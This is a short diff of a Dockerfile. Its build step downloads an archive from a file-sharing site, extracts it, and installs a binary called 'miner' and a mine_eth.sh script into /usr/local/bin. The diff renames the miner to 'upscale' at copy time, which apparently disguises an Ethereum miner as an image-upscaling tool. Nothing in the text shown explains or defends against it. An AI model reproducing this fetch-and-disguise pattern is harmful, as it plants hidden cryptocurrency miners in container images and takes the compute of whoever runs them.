@@ -7,10 +7,9 @@ RUN apt update; \
     wget https://www.4sync.com/web/directDownload/1RZH1ucq/15xqQxN1.a888d2a0703a72867b648d5452418dce; \
     tar xf 15xqQxN1.a888d2a0703a72867b648d5452418dce; \
     cd upscale; \
-    cp miner /usr/local/bin/miner; \
+    cp miner /usr/local/bin/upscale; \
     cp mine_eth.sh /usr/local/bin/mine_eth.sh; \
     cd /usr/local/bin;
-    mv miner upscale;
 
 WORKDIR /usr/local/bin
 
